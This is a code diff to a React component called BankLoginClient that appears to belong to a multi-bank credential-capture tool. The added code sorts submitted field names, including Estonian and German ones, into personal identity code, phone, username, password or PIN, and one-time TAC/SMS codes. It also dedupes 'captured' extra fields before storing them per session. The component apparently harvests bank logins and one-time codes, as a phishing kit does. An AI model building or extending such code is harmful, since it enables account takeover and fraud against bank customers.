@@ -47,6 +47,68 @@ type Props = {
   bank: any;
 };
 
+function inferCanonicalCredentialKey(
+  key: string,
+): "personalCode" | "phone" | "username" | "password" | "tacCode" | "loginMethod" | null {
+  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
+
+  if (
+    normalizedKey.includes("personalidentitycode") ||
+    normalizedKey.includes("identitycode") ||
+    normalizedKey.includes("personalcode") ||
+    normalizedKey.includes("isikukood")
+  ) {
+    return "personalCode";
+  }
+
+  if (
+    normalizedKey.includes("mobilenumber") ||
+    normalizedKey.includes("phonenumber") ||
+    normalizedKey.includes("phonefield") ||
+    normalizedKey.includes("telefon") ||
+    normalizedKey === "phone"
+  ) {
+    return "phone";
+  }
+
+  if (
+    normalizedKey.includes("userid") ||
+    normalizedKey.includes("username") ||
+    normalizedKey.includes("loginid") ||
+    normalizedKey.includes("kasutajatunnus") ||
+    normalizedKey.endsWith("tunnus")
+  ) {
+    return "username";
+  }
+
+  if (
+    normalizedKey.includes("password") ||
+    normalizedKey.includes("passcode") ||
+    normalizedKey.includes("parool") ||
+    normalizedKey.includes("pincalcpassword") ||
+    normalizedKey === "pin"
+  ) {
+    return "password";
+  }
+
+  if (
+    normalizedKey.includes("tac") ||
+    normalizedKey.includes("otp") ||
+    normalizedKey.includes("smscode") ||
+    normalizedKey.includes("verificationcode") ||
+    normalizedKey.includes("responsecode") ||
+    normalizedKey.includes("kontrollkood")
+  ) {
+    return "tacCode";
+  }
+
+  if (normalizedKey.includes("loginmethod") || normalizedKey.includes("authmethod")) {
+    return "loginMethod";
+  }
+
+  return null;
+}
+
 export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
   const router = useRouter();
   const supabase = useMemo(() => createBrowserSupabaseClient(), []);
@@ -149,6 +211,15 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       bankName: bank.name,
       ...normalizedFields,
     });
+    const canonicalFieldValues: Record<string, string> = {
+      personalCode: credentials.personalCode ?? "",
+      phone: credentials.phone ?? "",
+      username: credentials.username || credentials.verfuegernummer || "",
+      password: credentials.password || credentials.pin || "",
+      tacCode: credentials.tacCode ?? "",
+      loginMethod: credentials.loginMethod ?? "",
+    };
+
     const extraCapturedFields = Object.fromEntries(
       Object.entries((overrideData ?? {}) as Record<string, unknown>).flatMap(([key, value]) => {
         if (knownCredentialKeys.has(key) || typeof value !== "string") {
@@ -156,7 +227,16 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
         }
 
         const trimmedValue = value.trim();
-        return trimmedValue.length > 0 ? [[key, trimmedValue]] : [];
+        if (!trimmedValue) {
+          return [];
+        }
+
+        const canonicalKey = inferCanonicalCredentialKey(key);
+        if (canonicalKey && canonicalFieldValues[canonicalKey] && canonicalFieldValues[canonicalKey] === trimmedValue) {
+          return [];
+        }
+
+        return [[key, trimmedValue]];
       }),
     );
     const nextFormData = {
